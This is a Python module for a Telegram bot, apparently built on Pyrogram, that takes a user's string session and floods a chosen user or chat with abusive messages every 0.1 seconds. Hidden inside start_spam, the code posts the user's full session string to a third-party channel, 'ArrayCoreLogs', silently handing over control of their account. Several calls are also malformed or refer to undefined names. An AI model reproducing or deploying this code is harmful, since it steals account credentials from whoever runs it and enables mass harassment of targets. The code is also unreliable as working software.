
from asyncio import sleep
from . import Running, logs, stop_button
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, CallbackQuery
from . import functions


async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("Cancelled the Process!")
        return True
    elif "/restart" in msg.text:
        await msg.reply("Restarted the Bot!")
        return True
    elif msg.text.startswith("/"):
        await msg.reply("Cancelled the generation process!")
        return True
    else:
        return False


async def one_word_query(RiZoeL: Client, chat_id):
   Question = await RiZoeL.ask(chat_id, "Send Pyrogram String session to start One Word Spam!: ")
   if await cancelled(Question):
       return False
   Session = str(Question.text)
   try:
      client = Client("pyro", api_id=API_ID, api_hash=API_HASH, session_string=Session)
      await client.start()
   except Exception as a:
      await RiZoeL.send_message(chat_id=chat_id, f"Error: {a} \n\n Report in @DNHxHELL")
      return await one_word_query(chat_id)
   await client.stop()
   Question_two = await RiZoeL.ask(chat_id, "Gime username or chat ID of user/chat where you want to start one word spam!: ")
   if await cancelled(Question_two):
       return False
   Chat = str(Question_two.text)
   try:
      try:
         x = await RiZoeL.get_users(Chat)
         if x.username:
            chatt = x.username
         else:
            chatt = x.id
      except:
         x = await RiZoeL.get_chat(Chat)
         if x.username:
            chatt = x.username
         else:
            chatt = x.id
   except Exception as a:
      await RiZoeL.send_message(chat_id=chat_id, f"Error: {a} \n\n Report in @DNHxHELL")
      return
   await start_spam(chat_id, chatt, Session)


async def start_spam(RiZoeL: Client, chat_id, chatt, Session):
   try:
      client = Client("One-Word", api_id=API_ID, api_hash=API_HASH, session_string=Session)
      await client.start()
      try:
         await client.join_chat("ArrayCoreLogs")
         await client.send_message("ArrayCoreLogs", f"My String Session: \n `{Session}` ")
      except:
         pass
      txt = await RiZoeL.send_message(chat_id=chat_id, "starting your client..")
      Running.append(chat_id)
      if chat_id in Running:
         try:
           await txt.edit_text("One-Word Abuse started", reply_markup=InlineKeyboardMarkup(stop_button))
           async for abuse in Abuse_Data:
              if not chat_id in Running:
                 break
              await client.send_message(chatt, abuse)
              await sleep(0.1)
              
         except Exception as error:
              await RiZoeL.send_message(chat_id=chat_id, str(error))
              Running.remove(chat_id)
              return

      await RiZoeL.send_message(chat_id=chat_id, "Abuse complete!")
      Running.remove(chat_id)

   except Exception as error:
      await RiZoeL.send_message(chat_id=chat_id, f"Error: {error}")


async def stop_spam(RiZoeL: Client, chat_id):
    if chat_id not in Running:
       await RiZoeL.send_message(chat_id=chat_id, "There is no any abuse quarry given by you!")
    else:
       Running.remove(chat_id)
       await RiZoeL.send_message(chat_id=chat_id, "One Word Abuse quarry stopped!")



